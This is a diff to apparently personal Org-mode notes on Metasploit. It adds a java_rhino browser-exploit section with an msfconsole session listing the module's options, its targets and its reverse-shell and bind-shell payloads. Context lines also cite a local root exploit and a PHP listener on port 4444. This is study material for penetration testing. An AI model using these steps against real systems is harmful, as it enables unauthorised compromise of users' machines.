@@ -14,6 +14,7 @@ ftp_version - this will version and fingerprint any running ftp server
 anonymous - this will check if the ftp server allows anonymous login
 snmp_enum - this will help in detection of devices that are using SNMP 
 snmp_login - will use a word list, attempting to login to the device
+smtp_enum - 
 
 * Related
 - Armitage
@@ -81,6 +82,56 @@ This will start a service running on 4444 and provide a php one liner to be exec
 ** 39166.c
 URL: https://vulners.com/exploitdb/EDB-ID:39166
 This exploit is specific for Ubuntu 14.04, and drops the attaker into a shell
+
+** java_rhino
+URL: [[http://elatov.github.io/2015/12/hack-windows7-with-the-java-rhino-exploit-using-metasploit/][Hack Windows7 with the Java Rhino Expoit - elatov]]
+#+BEGIN_EXAMPLE
+msf > use exploit/multi/browser/java_rhino
+msf exploit(java_rhino) > show options
+
+Module options (exploit/multi/browser/java_rhino):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Generic (Java Payload)
+
+msf exploit(java_rhino) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Generic (Java Payload)
+   1   Windows Universal
+   2   Apple OSX
+   3   Linux x86
+   
+msf exploit(java_rhino) > show payloads
+
+Compatible Payloads
+===================
+
+   Name                                                Disclosure Date  Rank    Description
+   ----                                                ---------------  ----    -----------
+   generic/custom                                                       normal  Custom Payload
+   generic/debug_trap                                                   normal  Generic x86 Debug Trap
+   generic/shell_bind_tcp                                               normal  Generic Command Shell, Bind TCP Inline
+   generic/shell_reverse_tcp                                            normal  Generic Command Shell, Reverse TCP Inline
+   generic/tight_loop                                                   normal  Generic x86 Tight Loop
+
+#+END_EXAMPLE
+
 
 * Lecture
 ** [[https://www.youtube.com/watch?v%3DadSQyRPpiBw][Getting Started with Meatasploit - Nathan Sweaney]]
